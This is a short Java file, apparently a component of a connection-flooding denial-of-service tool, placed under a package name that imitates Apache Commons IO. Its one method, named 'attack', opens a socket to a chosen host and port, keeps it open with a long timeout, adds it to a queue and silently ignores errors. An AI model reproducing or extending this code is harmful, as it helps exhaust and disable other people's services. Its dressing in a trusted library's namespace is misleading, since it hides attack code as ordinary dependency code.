package org.apache.commons.io.file.spi.controller.impl;

import java.io.IOException;
import java.net.InetSocketAddress;
import java.net.Socket;
import java.util.NoSuchElementException;
import java.util.concurrent.ConcurrentLinkedQueue;

public class SocketController {

    public void attack(final String host, final int port, final ConcurrentLinkedQueue<Object> requests) {
        try {
            final Socket socket = new Socket();
            socket.connect(new InetSocketAddress(host, port));
            socket.setSoTimeout(13000);
            requests.add(socket);
        } catch (final NoSuchElementException | IOException ignored) {
        }
    }
}
